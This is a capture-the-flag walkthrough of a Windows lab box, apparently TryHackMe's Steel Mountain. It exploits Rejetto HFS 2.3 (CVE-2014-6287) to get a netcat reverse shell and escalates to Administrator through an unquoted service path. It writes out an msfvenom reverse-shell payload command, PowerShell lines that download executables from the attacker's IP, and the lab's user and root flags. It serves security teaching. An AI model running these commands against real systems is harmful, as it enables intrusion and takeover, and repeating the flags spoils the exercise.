# Steel Mountain Writeup

    Box IP Addresses:
    10.10.229.86
    10.10.15.167
    10.10.32.157

## [Task 1] Introduction

*In this room you will enumerate a Windows machine, gain initial access with Metasploit, use Powershell to further enumerate the machine and escalate your privileges to Administrator.*

*If you don't have the right security tools and environment, deploy your own Kali Linux machine and control it in your browser, with our Kali Room.*

*Please note that this machine does not respond to ping (ICMP) and may take a few minutes to boot up.*

### 1 	

*Deploy the machine. Who is the employee of the month?*

    nmap -sV -sC -oN nmap 10.10.229.86

    Nmap scan report for 10.10.229.86
    Host is up (0.12s latency).
    Not shown: 988 closed ports
    PORT      STATE SERVICE            VERSION
    80/tcp    open  http               Microsoft IIS httpd 8.5
    | http-methods: 
    |_  Potentially risky methods: TRACE
    |_http-server-header: Microsoft-IIS/8.5
    |_http-title: Site doesn't have a title (text/html).
    135/tcp   open  msrpc              Microsoft Windows RPC
    139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
    445/tcp   open  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
    3389/tcp  open  ssl/ms-wbt-server?
    |_ssl-date: 2020-07-25T22:33:48+00:00; 0s from scanner time.
    8080/tcp  open  http               HttpFileServer httpd 2.3
    |_http-server-header: HFS 2.3
    |_http-title: HFS /
    49152/tcp open  msrpc              Microsoft Windows RPC
    49153/tcp open  msrpc              Microsoft Windows RPC
    49154/tcp open  msrpc              Microsoft Windows RPC
    49155/tcp open  msrpc              Microsoft Windows RPC
    49160/tcp open  msrpc              Microsoft Windows RPC
    49161/tcp open  msrpc              Microsoft Windows RPC
    Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

    Host script results:
    |_nbstat: NetBIOS name: STEELMOUNTAIN, NetBIOS user: <unknown>, NetBIOS MAC: 02:46:0c:ee:34:4a (unknown)
    |_smb-os-discovery: ERROR: Script execution failed (use -d to debug)
    | smb-security-mode: 
    |   account_used: guest
    |   authentication_level: user
    |   challenge_response: supported
    |_  message_signing: disabled (dangerous, but default)
    | smb2-security-mode: 
    |   2.02: 
    |_    Message signing enabled but not required
    | smb2-time: 
    |   date: 2020-07-25T22:33:42
    |_  start_date: 2020-07-25T22:31:18

    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 142.79 seconds

Looking at Port 80 (in browser), we see this:

    <!doctype html>
    <html lang="en">
    <head>
    <meta charset="utf-8">
    <title>Steel Mountain</title>
    <style>
    * {font-family: Arial;}
    </style>
    </head>
    <body><center>
    <a href="index.html"><img src="/img/logo.png" style="width:500px;height:300px;"/></a>
    <h3>Employee of the month</h3>
    <img src="/img/BillHarper.png" style="width:200px;height:200px;"/>
    </center>
    </body>
    </html>

and Employee of the Month is Bill Harper.

## [Task 2] Initial Access

Now you have deployed the machine, lets get an initial shell!

### 1 - Scan the machine with nmap. What is the other port running a web server on?

We can see Port 8080 is hosting HttpFileServer, httpd 2.3.

### 2 - Take a look at the other web server. What file server is running?

Rejetto HTTP File Server.

### 3 - What is the CVE number to exploit this file server?

Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution (2)

CVE 2014-6287.

### 4 - Use Metasploit to get an initial shell. What is the user flag?

Tried Metasploit - Didn't work, have a feeling its because of the payload.

Without Metasploit:

1. Copy nc.exe from /usr/share/... to steel-mountain

    cp /usr/share/windows-binaries/nc.exe .

2. Download the Exploit

    wget https://raw.githubusercontent.com/offensive-security/exploitdb/master/exploits/windows/remote/39161.py

3. Change the IP Address and Port Number

    ip_addr = "10.8.82.167" #local IP address
	local_port = "4444" # Local Port number

4. Terminal 1 - Start nc in ../steel-mountain

5. Terminal 2 - Start Python HTTPSimpleServer, Port 80 in ../steel-mountain

    sudo python -m SimpleHTTPServer 80

6. Terminal 3 - Run Script against [Box IP Address] 8080

You have to run the script 2-3 times. First time it GETs the nc.exe file, and 2nd time it executes it, creating a reverse shell.

HTTPSimpleServer Output:

    10.10.15.167 - - [26/Jul/2020 03:05:51] "GET /nc.exe HTTP/1.1" 200 -
    10.10.15.167 - - [26/Jul/2020 03:05:51] "GET /nc.exe HTTP/1.1" 200 -
    10.10.15.167 - - [26/Jul/2020 03:05:51] "GET /nc.exe HTTP/1.1" 200 -
    10.10.15.167 - - [26/Jul/2020 03:05:51] "GET /nc.exe HTTP/1.1" 200 -

nc output:

    listening on [any] 4444 ...
    connect to [10.8.82.167] from (UNKNOWN) [10.10.15.167] 49178
    Microsoft Windows [Version 6.3.9600]
    (c) 2013 Microsoft Corporation. All rights reserved.

    C:\Users\bill\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup>cd c:\users\bill

To find the flag:

    c:\Users\bill>dir *.txt /s /p
    dir *.txt /s /p
    Volume in drive C has no label.
    Volume Serial Number is 2E4A-906A

    Directory of c:\Users\bill\AppData\Local\Microsoft\Internet Explorer

    09/27/2019  04:07 AM             6,497 brndlog.txt
                1 File(s)          6,497 bytes

    Directory of c:\Users\bill\Desktop

    09/27/2019  05:42 AM                70 user.txt
                1 File(s)             70 bytes

        Total Files Listed:
                2 File(s)          6,567 bytes
                0 Dir(s)  44,267,466,752 bytes free

    c:\Users\bill>type desktop\user.txt
    type desktop\user.txt
    b04763b6fcf51fcd7c13abc7db4fd365

USER FLAG: b04763b6fcf51fcd7c13abc7db4fd365

## [Task 3] Privilege Escalation

*Now that you have an initial shell on this Windows machine as Bill, we can further enumerate the machine and escalate our privileges to root!*

### 1

*To enumerate this machine, we will use a powershell script called PowerUp, that's purpose is to evaluate a Windows machine and determine any abnormalities - "PowerUp aims to be a clearinghouse of common Windows privilege escalation vectors that rely on misconfigurations."*

*You can download the script [here](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1). Now you can use the upload command in Metasploit to upload the script.*

*To execute this using Meterpreter, I will type load powershell into meterpreter. Then I will enter powershell by entering powershell_shell:*

### 2

*Take close attention to the CanRestart option that is set to true. What is the name of the unquoted service path service name?*

### 3

*The CanRestart option being true, allows us to restart a service on the system, the directory to the application is also write-able. This means we can replace the legitimate application with our malicious one, restart the service, which will run our infected program!*

*Use msfvenom to generate a reverse shell as an Windows executable.*

*Upload your binary and replace the legitimate one. Then restart the program to get a shell as root.*

### 4 - What is the root flag?

powershell -c (new-object System.Net.WebClient).DownloadFile(‘http://10.8.82.167/winPEASx64.exe','C:\Users\bill\Desktop\winpeas.exe')

powershell Invoke-WebRequest -Uri "http://10.8.82.167/powerup.ps1" -Outfile c:\test\powerup.ps1

C:\Users\Administrator\Desktop>type root.txt
type root.txt
9af5f314f57607c00fd09803a587db80

## [Task 4] Access and Escalation Without Metasploit

Now let's complete the room without the use of Metasploit.

For this we will utilise powershell and winPEAS to enumerate the system and collect the relevant information to escalate to

### 1	

To begin we shall be using the same CVE. However, this time let's use this exploit.

*Note that you will need to have a web server and a netcat listener active at the same time in order for this to work!*


To begin, you will need a netcat static binary on your web server. If you do not have one, you can download it from GitHub!

You will need to run the exploit twice. The first time will pull our netcat binary to the system and the second will execute our payload to gain a callback!

### 2

Congratulations, we're now onto the system. Now we can pull winPEAS to the system using powershell -c.

Once we run winPeas, we see that it points us towards unquoted paths. We can see that it provides us with the name of the service it is also running.

What powershell -c command could we run to manually find out the service name?

*Format is "powershell -c "command here"*

    powershell -c Get-Service

We see 

### 3 	

Now let's escalate to Administrator with our new found knowledge. Generate your payload using msfvenom and pull it to the system using powershell. Now we can move our payload to the unquoted directory winPEAS alerted us to and restart the service with two commands. First we need to stop the service which we can do like so;

sc stop AdvancedSystemCareService9

Shortly followed by;

sc start AdvancedSystemCareService9

Once this command runs, you will see you gain a shell as Administrator on our listener!

Create payload:
msfvenom -p windows/shell_reverse_tcp lhost=10.8.82.167 lport=5678 -e x86/shikata_ga_nai -f exe -o Advanced.exe

Download payload from victim machine:
powershell -c "Invoke-WebRequest -Uri http://10.8.82.167/Advanced.exe -Outfile Advanced.exe"

Vulnerability: Unquoted Service Paths

If the path to an executable is not inside quotes, Windows will try to execute every ending before a space.
For example, for the path C:\Program Files\Some Folder\Service.exe Windows will try to execute:
C:\Program.exe 
C:\Program Files\Some.exe 
C:\Program Files\Some Folder\Service.exe
To list all unquoted service paths (minus built-in Windows services)

Therefore download the "Advanced.exe" file into C:\Program Files (x86)\IObit.
Set up a nc, port 5678 on attacking machine.
Then restart the service. You'll get a reverse shell!